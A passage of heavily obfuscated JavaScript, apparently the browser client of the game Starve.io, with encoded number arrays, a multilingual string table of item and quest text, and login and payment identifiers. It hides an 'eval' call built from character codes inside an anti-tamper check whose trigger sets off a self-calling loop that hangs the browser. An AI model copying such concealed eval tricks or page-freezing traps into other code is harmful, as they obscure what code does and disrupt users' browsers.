			[56, 15, 90, 15, 0, 55, 90, 85],
			[48, 50, 57, 26, 52, 9, 82, 77],
			[18, 58, 57, 2, 17, 49, 78, 72, 28, 34, 57, 16],
			[39, 19, 19, 243, 227, 196, 201, 232, 220, 181, 214, 181],
			[234, 205, 205, 245, 238, 188, 218, 173],
			[242, 255, 213, 225, 207, 209, 174, 236],
			[206, 223, 170, 209, 206, 214, 205, 144, 194, 228, 233, 200, 198, 254, 241, 196, 202, 153, 250, 145],
			[251, 156, 249, 217, 224, 234, 253, 206, 239, 225, 134, 209, 219, 242, 208, 129],
			[231, 211, 249, 171, 155, 147, 254, 249],
			[167, 129, 171, 189, 147, 156, 153, 186],
			[151, 153, 250, 184, 136, 191, 171, 184, 143, 151, 234, 229],
			[187, 232, 238, 182, 191, 236, 234, 208, 187, 186, 139, 212, 135, 177, 177, 157, 141, 187, 214, 209],
			[183, 131, 214, 133, 149, 186, 190, 201],
			[145, 177, 155, 140, 163, 175, 173, 137, 167, 191, 61, 60],
			[91, 49, 124, 51, 75, 125, 65, 52],
			[83, 57, 74, 126, 108, 78, 45, 44],
			[113, 33, 66, 102, 76, 64, 86, 41, 64, 76, 78, 87, 124, 114, 114, 77, 71, 98, 25, 24],
			[69, 96, 17, 26],
			[78, 108, 122, 25, 74, 106, 122, 89, 81, 1, 98, 70, 87, 96, 13, 85],
			[88, 124, 80, 71, 90, 126, 125, 124],
			[38, 4, 40, 49, 28, 22, 117, 116],
			[41, 38, 26, 39, 44, 125, 101, 36, 8, 4, 26, 101],
			[52, 101, 109, 50, 57, 54, 26, 51, 61, 108, 50, 9, 1, 13, 53, 88],
			[5, 85, 81, 88, 9, 6, 34, 1],
			[12, 93, 69, 26, 17, 30, 77, 2],
			[21, 63, 50, 21, 30, 22, 42, 8, 26, 58, 210, 237, 216, 238, 194, 180, 228, 207, 217, 180],
			[211, 220, 222, 230, 223, 189, 232, 249, 241, 160, 217, 168],
			[207, 207, 214, 233, 248, 252, 161, 160],
			[252, 173, 149, 213, 248, 251, 234, 223, 255, 240, 204, 197],
			[200, 153, 153, 212, 244, 248, 246, 218, 215, 235, 250, 133, 239, 239, 234, 213, 227, 137, 212, 213, 220, 210, 164, 173],
			[152, 173, 142, 179, 164, 150, 245, 244],
			[174, 188, 241, 240],
			[172, 152, 134, 165, 176, 224, 158, 224],
			[181, 229, 142, 170, 128, 140, 146, 237],
			[191, 237, 182, 212, 129, 171, 174, 137, 133, 212, 165, 212],
			[137, 134, 213, 221, 183, 183, 162, 157],
			[145, 158, 162, 157, 172, 182, 197, 196],
			[168, 150, 132, 139, 167, 88, 80, 120, 78, 111, 67, 127, 100, 101, 79, 63],
			[82, 62, 52, 123, 109, 125, 71, 120, 119, 83, 67, 125],
			[77, 95, 32, 110, 66, 75, 113, 107],
			[70, 87, 28, 31],
			[112, 115, 16, 22, 104, 109, 111, 83, 72, 65, 107, 27],
			[75, 104, 112, 15],
			[81, 89, 115, 66, 109, 105, 4, 7],
			[88, 14, 115, 86, 93, 7, 20, 127],
			[25, 118, 19, 118, 17, 15, 37, 62, 17, 29, 112, 115],
			[22, 61, 23, 56, 50, 102, 49, 47, 53, 107, 15, 47, 1, 25, 19, 40, 61, 39, 88, 27],
			[0, 87, 51, 15, 62, 48, 35, 19, 50, 52, 6, 83],
			[14, 39, 64, 26, 41, 70, 35, 37, 45, 47, 76, 17, 33, 36, 55, 14, 29, 237, 226, 191],
			[218, 182, 237, 238, 228, 227, 207, 186],
			[232, 226, 234, 179],
			[214, 253, 199, 162, 202, 197, 168, 171],
			[245, 170, 172, 227, 193, 196, 211, 238, 250, 205, 244, 159],
			[249, 201, 201, 213, 197, 238, 251, 198, 206, 228, 252, 147],
			[246, 131, 251, 222, 234, 236, 231, 218, 229, 239, 193, 214, 217, 235, 235, 203, 219, 129, 252, 255],
			[155, 245, 252, 247, 165, 166, 139, 186, 169, 171, 240, 243],
			[172, 227, 147, 161, 178, 131, 155, 186],
			[181, 234, 236, 169, 185, 238, 155, 181],
			[138, 141, 183, 140, 177, 188, 141, 145],
			[190, 218, 208, 159, 136, 222, 212, 157, 181, 161, 204, 207],
			[146, 198, 163, 195, 148, 143, 196, 199],
			[152, 207, 175, 146, 99, 64, 63, 62],
			[103, 104, 80, 115, 106, 58, 80, 103, 93, 63, 118, 103, 115, 34, 95, 46],
			[77, 39, 47, 97, 121, 43, 118, 119],
			[126, 90, 39, 44],
			[67, 79, 73, 30],
			[113, 109, 108, 81, 74, 126, 70, 81, 118, 124, 19, 18],
			[106, 3, 100, 3, 97, 88, 96, 77, 91, 126, 3, 78, 95, 15, 104, 118, 26, 22, 4, 40, 30, 29, 15, 122],
			[17, 123, 115, 62, 46, 32, 24, 37, 52, 16, 111, 110],
			[13, 59, 0, 62, 1, 52, 34, 55, 63, 42, 99, 98],
			[58, 12, 26, 21, 6, 86, 47, 90],
			[11, 4, 60, 17, 54, 53, 63, 82],
			[41, 41, 48, 4, 46, 34, 67, 28, 41, 75, 18, 11, 30, 58, 47, 66],
			[209, 217, 200, 250, 221, 221, 234, 196, 236, 222, 208, 230, 214, 213, 199, 178],
			[202, 208, 175, 174],
			[246, 194, 175, 252, 194, 200, 167, 166],
			[255, 240, 200, 235, 194, 146, 248, 207, 245, 151, 206, 215, 202, 238, 251, 150],
			[246, 159, 248, 159, 225, 131, 139, 198, 208, 242, 224, 131, 220, 248, 135, 134],
			[223, 142, 236, 215, 163, 175, 147, 254],
			[158, 247, 144, 247, 153, 164, 243, 250, 174, 160, 156, 191, 178, 188, 182, 151, 182, 146, 186, 187, 186, 183, 136, 136, 134, 138, 144, 239],
			[130, 182, 164, 215],
			[128, 173, 172, 143, 138, 135, 164, 152, 181, 181, 188, 131],
			[147, 195, 164, 195],
			[151, 198, 164, 194, 154, 190, 175, 198],
			[158, 207, 202, 61],
			[98, 48, 85, 52, 80, 107, 81, 112, 109, 93, 93, 118, 105, 75, 103, 124, 72, 69, 65, 120, 118, 113, 42, 37],
			[123, 77, 93, 107, 126, 89, 115, 85, 123, 85, 30, 25],
			[127, 126, 109, 81, 75, 25, 98, 17],
			[124, 67, 67, 94, 98, 101, 6, 4, 123, 92, 101, 122, 90, 84, 113, 84, 88, 111, 2, 125],
			[23, 21, 47, 49, 33, 2, 2, 122, 24, 18, 1, 53, 20, 22, 36, 109],
			[51, 5, 63, 33],
			[54, 49, 106, 101],
			[58, 105, 9, 52, 57, 22, 9, 26],
			[52, 39, 8, 89],
			[6, 11, 49, 31, 11, 45, 45, 6, 55, 63, 82, 77],
			[21, 65, 57, 4, 17, 49, 34, 69],
			[32, 23, 23, 9, 39, 63, 66, 189],
			[219, 218, 205, 238, 220, 222, 197, 228],
			[209, 187, 178, 249, 215, 214, 236, 173],
			[245, 213, 197, 160, 241, 211, 209, 235, 248, 205, 255, 233],
			[196, 172, 231, 214, 194, 144, 245, 245, 252, 254, 245, 199],
			[202, 153, 253, 197, 206, 157, 253, 201, 208, 229, 134, 218],
			[230, 227, 229, 245, 235, 235, 134, 129],
			[223, 249, 233, 242, 155, 149, 180, 249],
			[159, 171, 171, 187, 173, 141, 157, 181],
			[174, 252, 153, 224, 135, 149, 191, 160, 143, 129, 238, 233, 189, 155, 230, 225],
			[132, 134, 149, 138, 183, 165, 219, 217],
			[188, 177, 181, 131, 187, 178, 177, 128, 143, 128, 189, 189, 144, 170, 189, 196, 175, 161, 194, 148, 154, 157, 198, 193],
			[153, 185, 57, 68, 91, 91, 86, 109, 80, 81, 66, 68],
			[104, 92, 90, 119, 109, 61, 86, 127, 72, 66, 41, 40],
			[76, 80, 78, 43, 123, 76, 82, 113, 75, 88, 76, 21, 120, 116, 92, 118, 127, 127, 122, 89, 72, 92, 17, 16],
			[76, 120, 92, 1, 104, 107, 126, 120, 87, 96, 9, 73, 94, 122, 1, 0],
			[100, 13, 22, 113, 22, 20, 40, 54, 36, 0, 36, 51, 16, 28, 2, 59, 44, 34, 2, 43],
			[48, 20, 109, 61, 12, 16, 14, 50],
			[62, 12, 105, 46, 60, 109, 46, 19],
			[3, 52, 81, 16, 60, 63, 34, 60, 48, 51, 4, 93],
			[55, 93, 73, 4, 22, 59, 62, 3, 20, 54, 69, 68],
			[27, 44, 73, 10, 26, 39, 209, 188],
			[225, 176, 214, 237, 226, 192, 221, 180],
			[233, 184, 222, 244, 236, 189, 228, 253, 199, 160, 198, 160, 244, 208, 205, 164],
			[251, 204, 169, 232, 196, 199, 234, 232, 244, 230, 149, 232],
			[252, 224, 254, 192, 206, 252, 207, 144],
			[205, 157, 216, 193, 232, 221, 230, 249, 236, 239, 211, 132],
			[227, 227, 254, 202, 220, 247, 171, 252],
			[152, 241, 146, 245, 144, 128, 164, 189, 144, 147, 188, 187, 172, 162, 134, 129, 136, 190, 142, 175, 140, 143, 137, 228],
			[131, 233, 229, 167],
			[138, 177, 182, 149, 187, 142, 178, 156],
			[131, 163, 161, 212],
			[139, 188, 217, 128, 140, 152, 205, 204],
			[171, 193, 156, 157, 149, 156, 182, 143, 160, 188, 170, 191, 154, 65, 60, 63],
			[97, 67, 60, 108, 102, 58, 95, 97],
			[89, 98, 91, 123, 86, 35, 67, 98, 113, 38, 33, 43],
			[116, 43, 91, 105, 122, 68, 76, 35],
			[125, 103, 119, 87, 121, 23, 119, 73],
			[67, 111, 16, 68, 113, 30, 85, 66, 126, 2, 73, 90, 80, 7, 120, 11],
			[86, 10, 111, 15],
			[89, 123, 123, 87, 101, 23, 54, 127],
			[32, 3, 124, 60, 38, 16, 27, 58, 41, 126, 121, 115],
			[21, 62, 27, 36, 49, 1, 27, 57, 14, 0, 19, 30, 57, 110, 15, 50],
			[60, 83, 51, 27, 1, 86, 17, 10],
			[4, 90, 63, 6, 49, 45, 80, 83],
			[13, 55, 55, 7, 41, 71, 35, 30, 45, 74, 44, 71],
			[33, 17, 17, 13, 29, 198, 207, 178, 230, 211, 253, 234],
			[221, 186, 241, 252, 210, 225, 203, 253, 222, 199, 233, 229, 242, 211, 208, 171],
			[244, 208, 211, 246, 193, 241, 241, 170]
		];
		for (let ⵠⵠⲆᐃⵠⲆⵠ = 0; ⵠⵠⲆᐃⵠⲆⵠ < ΔᐃⲆⵠⲆⵠΔ["length"]; ⵠⵠⲆᐃⵠⲆⵠ++) ΔᐃⲆⵠⲆⵠΔ[ⵠⵠⲆᐃⵠⲆⵠ] = ᐃⲆᐃΔᐃⵠᐃ["atob"](ⲆⵠΔΔⲆΔΔⵠΔ(ΔᐃⲆⵠⲆⵠΔ[ⵠⵠⲆᐃⵠⲆⵠ]));
		var ⲆⵠΔΔΔΔⲆ = 97;
		if (ⲆⵠΔΔΔΔⲆ > 8) ⲆⵠΔΔΔΔⲆ = 66;
		var ΔΔⵠΔΔΔⵠ = 113;
		const ΔⲆⵠᐃᐃΔⲆⲆᐃ = 152;
		const ⲆⵠⵠⵠΔⲆᐃ = 143 + 50 << 8;
		const ⲆᐃⲆΔΔᐃⵠ = 241;
		if (ΔⲆⵠᐃᐃΔⲆⲆᐃ > ⲆᐃⲆΔΔᐃⵠ) ΔΔⵠΔΔΔⵠ = 119;
		const ⵠ = ["#564021", "#68622D", "#0b2326", "middle", "#281A49", "round", ".md-languages label button", "Allow you to calm crabs, and heal them", "#322413", "getAuthResponse", "#043c37", "claim_reward_", "#83ddd4", "011_011_010", "010_110_110", "Cactus", "#614627", "#a7983c", "#c27add", "Communist", "Réchauffe en dehors de l'eau et dans l'hiver", "MADBalgouthi", "Starve.io ", "Damage: 1", "#939393", "#816511", "wtb", "000_111_010", "#58645F", "active", "#133a2b", "#b29e4d", "Lifetime: 8 days", "DESERT", "Useful to destroy buildings", "inline-block", "Winter", "event", "#d7990c", "px", "#c4a23a", "This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack.", "#462966", "#e7dc8f", "Durabilité: 1000", " After 1 day, survive in winter", "#77371f", "010_110_000", "#73583e", "#328587", "010_010_000", "#75827D", "010_011_000", "Защищает от холода вне воды.", "Bueno para destruir estructuras", "'Baloo Paaji', sans-serif", "#b15ecf", "Food: 20", "Daño: 2", "Oh, yeah? Is there crab in the crab sticks?", "Damage: 5", "#115E60", "#2b9390", "starve_quality", "#1a4935", "#072824", "#120202", "000_111_110", "Players Defense: 4", "#785f4c", "dw", "#c04933", "Используется для разрушения зданий", "Ciepło w i poza zimą", "#73dde5", "durabilidade: 700", "#211108", "cancel_sure_delete", "Taco4Life", "#392C16", "#4c3b19", "time_finished_", "application/x-www-form-urlencoded", "account_nickname_input", "#1a4545", "#7f6d52", "#4eb687", "#083326", "#163a3a", "110_111_010", "000_111_000", "Dégâts: 2", "#e0f2f6", "#252525", "#5cc5ce", "Czas życia: 8 dni", "servselect", "#0F464C", "#95d5d8", "defesa de jogadores: 4, defesa de animais: 16", "#B26F31", "cave o chão para pegar terra, areia e gelo", "#3dc4c0", "#182935", "#c4bc51", "Durabilité: 700", "#a33e2b", "starve_quests", "#47341d", "winter_7", " you can only hit people who are flying too", "#0d1b1c", "#136167", "#35b1b5", "#89d1d4", "#174a51", "#8c29aa", "#afac98", "#0e3838", "#113f3c", "010_111_011", "111_111_010", "#A9D6D3", "</div>", "#0B6A84", "010_111_110", "#0a2728", "Building Damage: 1", "Schaden an Gebäuden: 1", "#EAEAEA", "Pomocny w niszczeniu budowli", "starve_aliasing", "#1f343f", "000_010_010", "Food: 10", "111_111_000", "claim_rewards", "mousemove", "plm", "init", "Obrażenia do budowli: 1", "110_111_111", "Защита от игроков: 4, Защита от животных: 16", "Défense: 4, Défense contre animaux: 16", "#6a7570", "pizza wa", "011_111_010", "011_011_000", "#032b23", "#184747", "starve_info_box", "qwerty_ing", "#0F3A24", "durabilidade: 2000", "#1678a2", "Durability: 2000", "la", "#523e26", "nu", "Emerald Machine", "#082b22", "010_111_111", "Damage: 4", "name", "#0a2f2b", "Score", "Damage: 30", "#c1b06b", "#8255b5", "Crab sticks", "Uuunnnggg", "#1f4948", "destination-out", "Cava para conseguir tierra, arena y hielo", "#29997c", "#a9e4ed", "inv_shop", "#25c5d6", "#596560", "bread_6", "#096d41", "#263947", "timeremain_", "Starve.io", "#1f5453", "constraintquest", "object", "#1e2021", "Crab Claw", "útil para destruir construções", "Прочность: 2000", "rgba(255, 255, 255, 0)", "You can also gather minerals", "#b29c32", "You are the king of crabs!", "110_110_110", "re", "#554139", "kit", "111_111_110", "Uuunnnggg...", "#D8DC74", "011_111_110", "Kill", "#7d5234", "#be8d50", "También puedes conseguir minerales", "You feel a great power emanating from this orb", "Building method: Grid. Press G to change", "000_110_110", "#FFFFFF", "010_111_000", "#BB0000", "low_ing", "starve_safe", "mouseup", "azerty_ing", " Be peaceful", "#1b170c", "typequest", " Constraints", "#8a938e", "Obrona przed graczami: 4, Obrona przed zwierzętami: 16", "#ac222a", "#252B28", "#74ede6", "#63c9d6", "#a08f47", "110_110_000", "#242330", " Collect 100 bread in deep winter", "Копайте землю, чтобы получить грязь, лед и песок", "stop", "dont_hit_5", "Haltbarkeit: 1000", "#e8e8e8", "010_011_011", "#5f6061", "Essen: 100", "Sandwich", "#C09D6F", "#34255d", " Open 5 treasure chests", "img/avatar-player14.png", "Damage: 24", "#163A3A", "input_ratio", "#141414", "#ee593d", "Chrono Quests", "points", " BACK TO THE GAME", "#485e66", "#FFF", "#281C08", "volume", "#e9dad9", "#d2c77b", "FB", "opacity", "#939995", "#574122", "LAVA", "upfiz", "#2b7c57", "#454545", "#032428", "Birth: 4min", "#183f3f", "110_110_010", "You can buy items on the shop in the next game with your points", "iblk", "#187484", "fo", "eject_member", "#0a4049", "000_111_011", "010_010_010", "010_011_010", "Durability: 1000", "#b7252c", "#e45936", "000_110_000", "#09373F", "Players Defense: 4, Animals Defense: 16", "#58452b", "Time Remaining", "Crab Helmet", "#adbcb5", "2d", "010_110_010", "high_ing", "Widget", "Anyone want to play?", "Прочность: 700", "Bed", "Survive without losing life", "gw", "000_011_011", "time", "home_craft", "&userid=", "_number", "#2A8B9B", "Wytrzymałość: 700", "#5cccc4", "starve_mapping", "pos", "Chapka", " QUIT", "#e4efe8", "Dig the ground to gather dirt, ice, and sand", "#1f773d", "Damage: 2", "#46554D", "fade", "click", "audio/ambience.mp3", "000_011_000", "#313041", "#54a4ba", "#2b280a", "amethyst_2", "#C98435", "lock_team", "#124949", "score", "killdragon_1", "#877d36", "#3A2A0D", "#382e19", "#042b30", "Easter Egg", "cursor", "treasure_chest_4", " Share on Twitter", "#7C5A29", "#1d1d22", "#b2d4d1", "#000000", "#4d4a2e", "#1d051e", "Wytrzymałość: 1000", "#123d38", "#077b49", "Haltbarkeit: 700", "_trad_number", "#3f332a", "de", "Du kannst auch Mineralien bekommen", "#2b5c48", "#123335", "#e2cf27", "#83827e", "#EFE4B4", " Claim rewards", "Durabilidad: 2000", "#0a0b0c", "#3ba578", "#C0BF55", "string", "#2E85A0", "Pixelbitie", "#107746", "#041c21", "#59c9c0", "#232828", "000_110_010", "Days survived", "#dfd1cb", "#bfb360", "#4C3B19", "#3d2a6e", "CrysTal", "#e6636a", "#0b3432", "110_111_000", "#200333", "serverAddressInput", "#5E3E1A", "durabilidade: 1000", "#1a7961", "#432516", "Game", "#44301b", "#87d2e6", "auth2", "#4c3a15", "Animals Defense: 13", "#21112D", " Gather 1 amethyst", "Grab herum um Dreck, Eis und Sand zu bekommen", "#46c2c9", "Crabs follow you", "#747471", "Sushui", "comida: 100", "#c26de0", "#073030", "#0c0c0d", "#493e26", "XPayStationWidget", "#2b6664", "Jedzenie: 100", "#654320", "011_111_000", "game_body", "#ffffff", "#bbbbbb", "#342C7C", "fod", "110_111_110", "shop_starterkit", "#9baaa3", "#c7a726", "#ddcf8a", "#9b2b25", "Daño para estructuras: 1", "011_111_011", "mousedown", "#43b5af", "playing", "#ff0000", "forest", "isl", "You will be cured faster", "Wytrzymałość: 2000", "aloner", "#394841", "#660000", "#57442a", "#af59cd", "Kop w ziemi aby zdobyć ziemię, lód i piasek", "#fff", "#0e3022", "#262114", "#8359d3", "WINTER", "recipe_craft", "Crab claws can also be eaten", "#f9efeb", " Collect 1 dragon heart", "#347f93", "#1F343F", "#33b4e4", "eogito", "#0a2d18", "dano em construções: 1", "#29aaa1", "Damage: 14", "você também pode pegar minerais", "CLAIM REWARD!", "#67766F", "#030d14", "gm", "#3fc9c9", "sw", "Продолжительность: 8 дней", "Utile pour détruire les bâtiments", "#764eb5", "#214C4B", "000_010_000", " Share on Facebook", "Durability: 400", "Haltbarkeit: 2000", "none", "On-Hit Damage: 3", "011_011_011", "#3da34d", "Lebenszeit: 8 Tage", "Warm outside water and in winter", "team_box", "#388AC7", "#092813", "#53A4D5", "#EDCE4F", "&region=", "011_111_111", "Hält dich warm außerhalb von Wasser und Winter", "#d45ce5", "Урон по строениям: 1", "#000", "000_011_010", "You can not attack when you use it", "px Baloo Paaji", " Reward", "buy_kit", "quit_chronoquest", "canvas", "They can't hit you and you can't hit them", "Durabilidad: 700", "dano: 2", "Building Damage: 4", "#f4efc6", "111_111_011", "#674C2A", "#A89F67", "#083b3a", "#07393d", "send", "play", "000_111_111", "Durabilidad: 1000", "#fef4f4", "#C6AF81", "nickname_input", "111_111_111", "#efd435", "Te calienta en invierno y fuera del agua", "#86d0d1", "#3e3c25", "Damage: 20", "source-over", "_blank", "survive20min_3", "gapi", "#4d2d14", " : ", "Crab Spear", "Schaden: 2", "#cd98e5", "110_111_011", "#111316", "#C1C0C0", "#123b3f", "#b864d6", "GET", "You are less cold, less thirsty, and less hungry", "Durability: 700", "When you are flying,", "#eda80d", "#A37943", "#c3be9a", "#0d2e33", "Totem", "starve_cancel", "#555555", "#c67933", "Building method: Free. Press G to change", "Прочность: 1000", "#092b29", "#B56D18", "#d588f1", "#2a2938", "Durabilité: 2000", "#B6222A", "timeremainingquest", "Nützlich um Gebäude zu zerstören", "#15514f", "#634828", "Content-Type", "Comida: 100", "id", "#A5A244", "#031619", "Creuse la terre, le sable et la neige", "#280e09", "010_111_010", "Так же вы можете получить ресурсы", "#24878f", "#EBF2F0", "#43aa82", "#86d4e0", "#7d6144", "nickname_block", "#665329", "#171a19", "Durée de vie: 8 jours", "cs", "Peut aussi récupérer des minéraux", "Урон: 2", "Możesz także zdobyć minerały", "#b3e0e3", "FOREST", "Damage: 3", "spectator", "#5E3C10", "Relax in this confortable bed", "#9E8456", "rewardquest", "Verteidigung gegen Spieler: 4, Verteidigung gegen Tiere: 16"];
		const ⵠᐃΔΔ = -1642 + 994 + 272 + 166 + 202 + 1 + 7 + 1 + 1 + 1 + 1;
		const ΔΔⵠⲆⵠ = 888 - 60 - 706 - 90 - 9 - 12 - 2;
		const ΔⵠⵠⵠΔⲆⲆ = -8;
		const ᐃᐃⵠΔⵠ = false;
		const ᐃΔⲆⲆⲆⵠⵠ = -4;
		const ΔⵠᐃΔⵠ = -3668 + 679 + 2629 + 192 + 35 + 20 + 78 + 33 + 9 + 1 + 2 + 1;
		const ΔΔΔΔΔⲆᐃ = 1920;
		const ΔⲆᐃⲆ = 3;
		const ⵠⲆⲆⵠᐃ = true;
		const ⵠᐃⵠⵠⲆ = 16;
		const ᐃⵠⵠⲆⵠᐃⲆ = 0;
		const ⵠᐃⲆΔΔ = 100;
		const ⵠⵠⲆⵠΔ = -1972 + 36 + 1067 + 821 + 10 + 38 + 3 + 2 + 1 + 1 + 1;
		const ΔⵠⲆⵠᐃ = -3296 + 684 + 2443 + 130 + 91 + 146 + 44 + 10 + 1 + 1 + 1;
		const ⵠⲆⲆᐃᐃⵠᐃ = String.fromCharCode;
		const ⵠⵠᐃⲆⵠⲆⵠ = 101;
		const ᐃΔⵠⵠⲆⲆⵠ = 118;
		const ᐃⵠⲆᐃ = "ᐃⲆᐃΔ";
		const ΔΔⵠⵠⲆⵠⵠ = 97;
		const ⵠΔΔⵠ = 108;
		const ᐃⲆΔⲆΔΔᐃ = ⵠⲆⲆᐃᐃⵠᐃ(ⵠⵠᐃⲆⵠⲆⵠ);
		const ᐃⲆⵠᐃΔⲆΔ = ⵠⲆⲆᐃᐃⵠᐃ(ᐃΔⵠⵠⲆⲆⵠ);

		function ᐃⲆᐃΔ() {
			ⲆᐃⲆⵠ = ᐃⲆᐃΔ;
			return ᐃⲆᐃΔ
		}
		const ⲆᐃΔⵠ = ⵠⲆⲆᐃᐃⵠᐃ(ΔΔⵠⵠⲆⵠⵠ);
		const ⲆⲆΔⵠⵠⵠⵠ = ⵠⲆⲆᐃᐃⵠᐃ(ⵠΔΔⵠ);
		const ΔⲆΔⲆᐃⲆΔ = ᐃⲆΔⲆΔΔᐃ + ᐃⲆⵠᐃΔⲆΔ + ⲆᐃΔⵠ + ⲆⲆΔⵠⵠⵠⵠ;
		const ΔᐃᐃⲆΔⲆⵠ = ᐃⲆᐃΔᐃⵠᐃ[ΔⲆΔⲆᐃⲆΔ];
		const ᐃᐃⵠⲆⵠΔᐃ = ΔᐃᐃⲆΔⲆⵠ(ᐃⲆᐃΔ + "try{" + ᐃⵠⲆᐃ + "();0;}catch(ⲆᐃΔⵠ){1;}");
		if (ᐃᐃⵠⲆⵠΔᐃ) {
			const ⵠⲆⲆᐃᐃⵠᐃ = function() {
				for (let ⵠⵠᐃⲆⵠⲆⵠ = 0; ⵠⵠᐃⲆⵠⲆⵠ < 5; ⵠⵠᐃⲆⵠⲆⵠ++) ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("click", (function() {
					ⵠⲆⲆᐃᐃⵠᐃ()
				}))
			};
			ⵠⲆⲆᐃᐃⵠᐃ()
		}
		const ⲆⵠᐃΔᐃ = -959 + 207 + 49 + 475 + 170 + 14 + 12 + 17 + 6 + 18 + 4 + 3 + 1;
		const ΔΔⲆⵠᐃ = 56 - 24 - 8 - 3 - 1;
		const ΔⲆⲆⵠᐃⵠⵠ = 1;
		const ⵠΔᐃ = -645 + 286 + 89 + 13 + 67 + 1 + 72 + 29 + 37 + 3 + 37 + 6 + 4 + 1 + 1;
		const ΔⲆⵠᐃⵠⵠΔ = 1183 - 103;
		const ⵠⲆᐃΔᐃ = 19;
		const ⵠⵠⵠⲆⵠ = undefined;
		const ⵠⵠΔⵠᐃ = 15;
		const ΔΔⵠΔΔᐃⲆ = -1299 + 350 + 1172 + 8 + 17 + 4 + 3 + 1;
		const Δⵠᐃⵠⵠ = -885 + 250 + 214 + 248 + 49 + 88 + 21 + 11 + 5 + 1 + 1 + 9 + 1;
		const ᐃᐃΔᐃⲆ = 481 - 412 - 47 - 4 - 4 - 2;
		const ΔⵠⵠⲆⵠ = -1211 + 424 + 776 + 4 + 7 + 9 + 5;
		const ᐃΔⲆᐃⵠⵠΔΔΔ = 1 << 0;
		const ΔⲆΔᐃᐃ = -1713 + 439 + 495 + 24 + 397 + 124 + 152 + 53 + 30 + 2 + 1 + 2 + 1;
		const ⲆⵠⵠⲆⲆ = 18;
		const ⵠⵠᐃΔΔ = ⲆⵠᐃΔᐃ;
		const ⵠⲆⵠⵠᐃΔΔ = 1 << ᐃᐃΔᐃⲆ;
		const ΔⲆⵠⲆΔΔⲆ = 6;
		const ΔⲆᐃᐃⵠᐃᐃ = 1 << 2;
		const ⵠⲆΔᐃⵠⲆⵠ = 1 << ΔⵠᐃΔⵠ;
		const ΔᐃΔᐃⲆΔᐃ = 1 << 1;
		const ᐃΔⲆⵠᐃ = ΔΔⲆⵠᐃ;
		const ⲆⵠⲆⵠⲆ = 10;
		const ᐃᐃΔΔⵠΔⲆ = ⵠΔᐃ << ΔⵠⵠⲆⵠ;
		const ΔⵠΔᐃᐃ = ⵠᐃⵠⵠⲆ;
		const ⵠⵠⵠΔ = -1288 + 255 + 579 + 15 + 247 + 35 + 62 + 68 + 17 + 6 + 3 + 2 + 1;
		const ᐃⵠΔΔⲆⵠⲆ = 0;
		const ⵠΔⵠⵠⵠ = ⵠⲆᐃΔᐃ;
		const ᐃⵠΔ = -1107 + 302 + 682 + 32 + 29 + 55 + 1 + 6;
		const ⵠᐃᐃΔ = 8 - 1 - 1;
		const ⲆΔΔⲆΔⵠⲆ = 8;
		const ⲆΔⵠᐃⲆΔⲆ = ᐃᐃΔᐃⲆ;
		const ᐃΔᐃⵠᐃΔΔ = 4;
		const ⵠⲆⵠⵠⵠᐃⵠ = ᐃᐃΔᐃⲆ;
		const ᐃⲆᐃⵠⲆⲆᐃ = ⵠᐃⵠⵠⲆ;
		const ⲆΔᐃⲆΔ = ᐃᐃⵠΔⵠ;
		let ⲆΔᐃⲆⵠᐃⲆ = ⵠⵠⵠⲆⵠ;
		let ⵠⵠΔⵠΔᐃⵠ = ⵠⵠⵠⲆⵠ;
		const ᐃⵠΔᐃΔ = ⵠⲆⲆⵠᐃ;
		let ⲆΔΔΔΔ = ⵠⵠⵠⲆⵠ;
		let ⲆⵠⲆⵠⲆⵠΔ = ⵠⵠⵠⲆⵠ;
		let ⵠᐃⵠⵠⵠⵠⲆ = undefined;
		const ΔΔᐃᐃΔ = ⵠᐃⵠⵠⲆ;
		let ᐃⲆⵠΔⲆᐃΔ = undefined;
		const ⵠᐃΔⵠᐃ = ⵠᐃᐃΔ;
		let ΔᐃᐃⵠΔⲆΔ = ⵠⵠⵠⲆⵠ;
		const ⲆⲆⲆΔΔ = ΔΔᐃᐃΔ;
		let ⲆᐃⲆᐃⵠΔᐃ = ⵠⵠⵠⲆⵠ;
		let ⵠⵠⲆΔᐃⲆⵠ = "_";
		let ⲆⲆⲆᐃⲆ = [];
		const ᐃⲆΔⵠ = ΔⲆᐃⲆ;
		let ΔᐃⲆΔΔⵠⵠ = undefined;
		const ⲆᐃⵠᐃⲆⵠⲆ = ΔΔΔΔΔⲆᐃ;
		let ΔⲆⲆⲆⲆⲆⲆ = ⵠⵠⵠⲆⵠ;
		let ᐃⵠⵠⲆⵠⲆΔ = undefined;
		const ΔΔΔⲆΔ = ⵠⵠⵠⲆⵠ;
		let ᐃΔΔᐃⲆ = ⵠⵠⵠⲆⵠ;
		let ΔⲆΔΔⲆⵠΔ = ΔΔΔⲆΔ;
		const ⵠⲆⲆΔᐃ = ΔΔⵠⲆⵠ;
		let ⵠᐃᐃΔⵠᐃⲆ = undefined;
		let ΔᐃᐃᐃᐃⲆΔ = ⵠⵠⵠⲆⵠ;
		let ⲆᐃᐃᐃⵠⲆΔ = undefined;
		let ᐃΔⵠᐃⵠⵠΔ = undefined;
		const ⵠΔⵠᐃⵠ = ⵠᐃᐃΔ;
		let ᐃᐃᐃⲆΔⵠⲆ = ΔΔΔⲆΔ;
		let ⵠⲆⲆΔΔⲆⵠ = ΔΔΔⲆΔ;
		let ᐃᐃⵠΔᐃᐃᐃ = undefined;
		let ⵠⵠΔᐃΔΔⵠ = undefined;
		let ΔⲆⲆΔᐃᐃΔ = undefined;
		const ⵠᐃⲆΔⵠᐃⵠ = ΔⲆⵠᐃⵠⵠΔ;
		let ⲆᐃⲆΔⲆΔⵠ = undefined;
		let ⲆᐃⵠⵠΔΔⲆ = undefined;
		const ⲆΔⲆⵠᐃ = ΔⵠⵠⲆⵠ;
		const ⲆⵠΔⵠⵠ = ⲆⵠⵠⲆⲆ;
		let ᐃΔΔⲆⲆⲆᐃ = undefined;
		let ΔⲆⲆΔⵠΔΔ = undefined;
		const ⵠᐃᐃⲆ = ⵠᐃΔΔ;
		const ᐃᐃᐃⵠⵠ = ΔⵠⲆⵠᐃ;
		const ΔᐃΔᐃᐃⲆⵠ = ⲆᐃⵠᐃⲆⵠⲆ;
		const ⲆⲆⲆᐃΔΔΔⲆⲆ = 171534;

		function ⵠⲆΔⵠΔⲆᐃᐃᐃ(ⵠᐃⵠᐃⵠΔΔ) {
			const ⲆⲆⲆᐃΔΔΔⲆⲆ = function() {
